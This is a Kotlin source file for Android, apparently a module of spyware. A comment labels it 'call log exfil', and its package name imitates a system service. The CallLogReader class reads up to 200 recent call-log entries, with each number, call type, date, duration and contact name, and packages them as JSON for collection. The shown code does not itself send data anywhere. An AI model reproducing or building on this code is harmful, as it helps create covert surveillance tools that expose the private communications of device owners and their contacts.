// [context: Kotlin, Android API 26+, call log exfil]
package com.system.service.modules.calls

import android.content.Context
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

class CallLogReader(private val context: Context) {

    fun readAll(limit: Int = 200): JSONArray {
        val arr = JSONArray()
        val projection = arrayOf(
            CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE,
            CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME
        )
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI, projection, null, null, "${CallLog.Calls.DATE} DESC"
        ) ?: return arr

        var count = 0
        cursor.use {
            while (it.moveToNext() && count < limit) {
                arr.put(JSONObject().apply {
                    put("number", it.getString(0) ?: "")
                    put("type", it.getInt(1))
                    put("date", it.getLong(2))
                    put("duration", it.getLong(3))
                    put("name", it.getString(4) ?: "")
                })
                count++
            }
        }
        return arr
    }
}
